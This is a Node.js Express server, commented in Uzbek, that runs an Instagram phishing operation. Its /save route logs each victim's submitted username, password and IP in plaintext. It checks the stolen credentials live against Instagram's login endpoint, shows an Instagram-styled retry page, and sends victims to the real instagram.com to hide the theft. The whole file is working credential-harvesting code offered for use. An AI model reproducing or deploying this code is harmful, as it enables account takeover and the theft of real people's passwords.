const express = require("express");
const session = require("express-session");
const fetch = require("node-fetch");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Session konfiguratsiyasi
app.use(session({
    secret: "your-secret-key",
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false } // HTTPS bo'lsa true qiling
}));

// Har bir IP uchun urinishlar sonini saqlash
const loginAttempts = new Map();
const MAX_ATTEMPTS = 3;

// Instagram tekshiruvi
async function instagramTekshir(username, password) {
    try {
        const response = await fetch("https://www.instagram.com/accounts/login/ajax/", {
            method: "POST",
            headers: {
                "content-type": "application/x-www-form-urlencoded",
                "x-requested-with": "XMLHttpRequest",
                "x-ig-app-id": "936619743392459",
                "x-csrftoken": "missing",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            body: new URLSearchParams({
                username: username,
                enc_password: `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${password}`,
                queryParams: "{}",
                optIntoOneTap: "false"
            })
        });

        const data = await response.json();
        return data.authenticated === true; // true = to'g'ri parol
    } catch (e) {
        return false;
    }
}

// Har bir IP uchun urinishlarni boshqarish
function getAttemptCount(ip) {
    const attemptData = loginAttempts.get(ip);
    if (!attemptData) {
        return 0;
    }
    
    // 30 daqiqa ichida 3 marta cheklash
    const now = Date.now();
    const recentAttempts = attemptData.timestamps.filter(timestamp => 
        now - timestamp < 30 * 60 * 1000 // 30 daqiqa
    );
    
    return recentAttempts.length;
}

function addAttempt(ip) {
    if (!loginAttempts.has(ip)) {
        loginAttempts.set(ip, { timestamps: [] });
    }
    
    const attemptData = loginAttempts.get(ip);
    attemptData.timestamps.push(Date.now());
    
    // Eski urinishlarni tozalash
    const now = Date.now();
    attemptData.timestamps = attemptData.timestamps.filter(timestamp => 
        now - timestamp < 60 * 60 * 1000 // 1 soat
    );
}

// Har soat eski ma'lumotlarni tozalash
setInterval(() => {
    const now = Date.now();
    for (const [ip, data] of loginAttempts.entries()) {
        data.timestamps = data.timestamps.filter(timestamp => 
            now - timestamp < 60 * 60 * 1000
        );
        
        if (data.timestamps.length === 0) {
            loginAttempts.delete(ip);
        }
    }
}, 60 * 60 * 1000); // Har soat

app.post("/save", async (req, res) => {
    try {
        const { username, password } = req.body;
        const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "unknown";
        const time = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });

        console.log(`TEKSHIRUV → ${time} | IP: ${ip} | USER: ${username} | PASS: ${password}`);

        // Urinishlar sonini tekshirish
        const attemptCount = getAttemptCount(ip);
        
        if (attemptCount >= MAX_ATTEMPTS) {
            console.log(`BLOKLANDI → IP: ${ip} 3 martadan ko'p urindi`);
            
            // Instagramga yo'naltirish
            res.redirect("https://www.instagram.com");
            return;
        }

        // Urinish sonini oshirish
        addAttempt(ip);

        const togri = await instagramTekshir(username, password);

        if (togri) {
            console.log(`MUVOFAQ → ${username} muvaffaqiyatli kirdi`);
            // To'g'ri parol bo'lsa Instagramga yo'naltirish
            res.redirect("https://www.instagram.com");
        } else {
            console.log(`XATO → ${username} paroli noto'g'ri (Urinish: ${attemptCount + 1}/${MAX_ATTEMPTS})`);
            
            // Noto'g'ri parol bo'lsa xabar ko'rsatish
            const remainingAttempts = MAX_ATTEMPTS - (attemptCount + 1);
            res.send(`
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="utf-8">
                    <title>Xato</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1">
                    <style>
                        body {
                            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                            background: #fafafa;
                            text-align: center;
                            padding: 50px 20px;
                            color: #262626;
                        }
                        .container {
                            max-width: 400px;
                            margin: 0 auto;
                            background: white;
                            padding: 40px;
                            border-radius: 12px;
                            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                        }
                        .error-icon {
                            font-size: 48px;
                            color: #ed4956;
                            margin-bottom: 20px;
                        }
                        h2 {
                            color: #ed4956;
                            margin-bottom: 10px;
                        }
                        .warning {
                            color: #ed4956;
                            font-weight: bold;
                            margin-top: 20px;
                            padding: 10px;
                            background: #fff5f5;
                            border-radius: 8px;
                            border: 1px solid #ffd1d1;
                        }
                        .button {
                            display: inline-block;
                            margin-top: 20px;
                            padding: 12px 30px;
                            background: #0095f6;
                            color: white;
                            text-decoration: none;
                            border-radius: 8px;
                            font-weight: 600;
                            transition: background 0.3s;
                        }
                        .button:hover {
                            background: #0074cc;
                        }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="error-icon">!</div>
                        <h2>Login yoki parol noto'g'ri</h2>
                        <p>Iltimos, qayta urinib ko'ring</p>
                        
                        ${remainingAttempts <= 1 ? 
                            `<div class="warning">Diqqat! So'nggi urinishingiz. Keyingi marta Instagram sahifasiga yo'naltirilasiz.</div>` : 
                            `<p>Qolgan urinishlar: <strong>${remainingAttempts}</strong></p>`
                        }
                        
                        <a href="/" class="button">Qayta urinish</a>
                    </div>
                    
                    <script>
                        // Avtomatik qayta yo'naltirish
                        setTimeout(() => {
                            location.href = "/";
                        }, 5000);
                        
                        // Urinishlar sonini saqlash
                        localStorage.setItem('login_attempts', ${attemptCount + 1});
                    </script>
                </body>
                </html>
            `);
        }
    } catch (error) {
        console.error("Server xatosi:", error);
        // Xato yuz bersa ham Instagramga yo'naltirish
        res.redirect("https://www.instagram.com");
    }
});

// Bosh sahifa
app.get("/", (req, res) => {
    res.sendFile(__dirname + "/index.html");
});

// Har qanday yo'nalish uchun Instagramga yo'naltirish
app.get("*", (req, res) => {
    res.redirect("https://www.instagram.com");
});

// Xatolarni ushlash
process.on("uncaughtException", (error) => {
    console.error("Kutilmagan xato:", error);
});

process.on("unhandledRejection", (reason, promise) => {
    console.error("Bajarilmagan va'da:", reason);
});

const port = process.env.PORT || 3000;
app.listen(port, "0.0.0.0", () => {
    console.log(`Server ${port}-portda ishlamoqda...`);
    console.log(`Har bir IP uchun maksimal urinishlar: ${MAX_ATTEMPTS}`);
});
